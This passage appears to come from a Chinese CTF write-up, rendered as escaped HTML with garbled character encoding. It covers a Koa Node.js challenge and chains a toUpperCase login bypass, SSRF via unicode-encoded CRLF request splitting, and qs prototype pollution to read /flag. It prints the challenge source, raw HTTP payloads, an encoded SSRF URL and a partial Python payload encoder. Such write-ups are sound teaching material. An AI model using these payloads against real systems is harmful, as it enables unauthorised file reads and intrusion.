&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;Delete the results Successfully!&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;Nothing to delete!&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userName&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">checkUser&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userName&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toUpperCase&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">)=&amp;gt;{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">isAdmin&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">list&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">isAdmin&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#75af00">isAdmin&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Privilege&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Staff&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;ADMIN&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Privilege&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Monitor&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">isAdmin&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;tmp/&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">existsSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">mkdirSync&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sandbox&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">list&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">isAdmin&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#75af00">isAdmin&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">keys&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;hpdoger&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">paths&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//depend on remote server,not real
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">server_ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">views&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;./views&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">extension&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;ejs&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;./static&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;./tmp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bodyParser&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">CONFIG&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span>&lt;span style="color:#111">()).&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">allowedMethods&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[demo] start-quick is starting at port 3000&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å””ï¼Œçœ‹èµ·æ¥è¦æ¯”å…¶å®ƒçš„å¤æ‚ä¸å°‘ï¼Œä½†æ˜¯æ ¸å¿ƒæ¼æ´ç‚¹æ˜¯ä¸€æ ·çš„ï¼›ç®€å•å®¡ä¸€ä¸‹ä»£ç &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206230457270.png" alt="image-20211206230457270">&lt;/p>
&lt;p>åªå…è®¸adminç”¨æˆ·æ‰å¯ä»¥åŠ è½½å…¶å®ƒçš„æ¨¡æ¿&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206230620584.png" alt="image-20211206230620584">&lt;/p>
&lt;p>ç¡®å®æ˜¯&lt;code>toUpperCase()&lt;/code>çš„é—®é¢˜ï¼Œå¾ˆè½»æ¾å°±ç”¨&lt;code>admÄ±n&lt;/code>ç»•è¿‡äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206231746702.png" alt="image-20211206231746702">&lt;/p>
&lt;p>/requestè·¯ç”±ä¸‹çš„è¯·æ±‚ç»è¿‡&lt;code>CheckUrl&lt;/code>çš„æ£€æŸ¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206231939254.png" alt="image-20211206231939254">&lt;/p>
&lt;p>å¿…é¡»å¼€å¤´æ˜¯http://127.0.0.1:3000/queryï¼Œæ²¡æ³•ç»•è¿‡ï¼Œéœ€è¦SSRFï¼›è¯·æ±‚ä¹‹åä¼šè¢«è®°å½•åœ¨sandboxçš„results.txté‡Œé¢ï¼ˆè¿½åŠ çš„å½¢å¼ï¼‰ï¼Œsandboxæ ¹æ®ipå»ºç«‹&lt;/p>
&lt;p>è€Œæ°å¥½/queryæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªè·¯ç”±&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206232301967.png" alt="image-20211206232301967">&lt;/p>
&lt;p>å¹¶ä¸”å‚æ•°paramæ¯”è¾ƒå¥½ç»•è¿‡ï¼Œæˆ‘ä»¬å€ŸåŠ©å®ƒæ¥å®Œæˆæˆ‘ä»¬çš„æ”»å‡»ï¼›æ¥ä¸‹æ¥æ‰¾åˆ©ç”¨ç‚¹ï¼Œçœ‹åˆ°/saveè·¯ç”±&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206234720831.png" alt="image-20211206234720831">&lt;/p>
&lt;p>ç®€å•çš„åˆ†æå†™åœ¨æ³¨é‡Šä¸­äº†ï¼Œ138è¡Œç”¨ssrfç»•è¿‡ï¼Œ146è¡Œä½¿ç”¨çš„qsåº“æœ‰&lt;a href="https://security.snyk.io/vuln/npm:qs:20170213">åŸå‹é“¾æ±¡æŸ“&lt;/a>çš„é—®é¢˜ï¼Œä¼ å‚&lt;code>]=switch&lt;/code>å³å¯ç»•è¿‡ï¼›154è¡Œçš„åˆ¤æ–­ä¹Ÿéœ€è¦ç»•è¿‡ï¼ŒåŸå‹é“¾æ±¡æŸ“sandboxä¸‹çš„ä¸€ä¸ªæ–‡ä»¶ä¸º&lt;code>/flag&lt;/code>ï¼Œå†å»è‡ªå®šä¹‰è¯»åˆ°spathä¸­&lt;/p>
&lt;pre tabindex="0">&lt;code>tmp[&amp;#39;__proto__&amp;#39;][&amp;#39;opath&amp;#39;] = &amp;#39;/flag&amp;#39;;
=&amp;gt;
paths.opath = /flag
&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">amiz HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Host: 127.0.0.1:3000
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Connection: keep-alive
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">GET /save?]=switch&amp;amp;sandbox=__proto__&amp;amp;opath=/flag&amp;amp;spath=/app/tmp/c74e4def8b621891bc34c84bca9b2a76
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>http://127.0.0.1:3000/query?param=1\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1:3000\u{010D}\u{010A}Connection:\u{0120}keep-alive\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0173}\u{0161}\u{0176}\u{0165}?]=switch&amp;amp;sandbox=__proto__&amp;amp;opath=/flag&amp;amp;spath=tmp/c74e4def8b621891bc34c84bca9b2a76
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207020732089.png" alt="image-20211207020732089">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207001654270.png" alt="image-20211207001654270">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207002041861.png" alt="image-20211207002041861">&lt;/p>
&lt;p>å½“ç„¶ï¼Œç”¨å®Œå…¨unicodeç¼–ç ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œäº²æµ‹è¿™ä¸ªå…¨ç¼–ç å®¹é”™ç‡ä¼šé«˜ä¸€ä¸¢ä¸¢&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">requests.utils&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">quote&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">_payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;amiz HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Host: 127.0.0.1:3000
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Connection: keep-alive
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">GET /save?]=switch&amp;amp;sandbox=__proto__&amp;amp;opath=/flag&amp;amp;spath=/app/tmp/c74e4def8b621891bc34c84bca9b2a76&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0xff&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">))[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">zfill&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span 